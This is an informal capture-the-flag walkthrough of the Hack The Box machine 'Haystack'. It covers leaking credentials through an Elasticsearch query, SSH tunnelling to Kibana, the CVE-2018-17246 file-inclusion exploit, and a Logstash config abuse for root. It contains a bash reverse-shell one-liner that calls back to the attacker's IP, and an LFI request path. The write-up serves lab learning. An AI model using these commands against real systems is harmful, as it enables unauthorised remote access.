<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.115 Haystack</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.115 Haystack</h1><br/>nmap showed that 22, 80, and 9200 were all open<br />bryan already had user so I cheated and took his advice downloading the main picture and cat-ing it<br />This showed a base 64 encoded string saying         la aguja en el pajar es &quot;clave&quot;<br />this was useful when going to the 9200 web server.<br /><a href="http://10.10.10.115:9200/quotes/_search?size=5000">http://10.10.10.115:9200/quotes/_search?size=5000</a><br />This synax is usefull when querying elastic.<br />we control f&#39;d through this looking for “clave”<br />pass: spanish.is.key<br />user: security                          &lt;&lt; after base64 decoding we found these<br />tried these creds with ssh... Success!!!<br />after poking around we found no obvious stuff so we went to the web looking for elk privesc stuff<br />we found on github an lfi to get us to kibana!!<br /><br />in order to do this we first needed to tunnel through our ssh connection and then to the target box itself<br />ssh -L 5601:127.0.0.1:5601 securtiy@10.10.10.115<br /><br />127.0.0.1:5601<code>/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../path/to/shell.js</code><br /><a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a> &lt;&lt;&lt;&lt;&lt;<br />after making a javascript reverse shell payload and starting a listener, we are now kibana!!!<br /><br />now the witchcraft starts...<br />after looking up millions of articles and endless google searching we thought that we must cheat.<br />we were right.<br />turns out logstash (the L in ELK) runs off of three files input.conf, filter.conf, output.conf.  &lt;just fun trivial knowledge<br />if we touch /opt/kibana/logstash_1<br />then inside of it put                        Ejecutar comando :  bash -i &gt;&amp; /dev/tcp/10.10.14.37/6666 0&gt;&amp;1                       &lt;&lt;the mexican stuff will change depending on output.conf<br />start a nc listener...<br />and within a minute we get a root shell!!<br />we had to cheat pretty good but learned a neat lesson at the end, any time you see code execution you have got a chance.</div></body></html>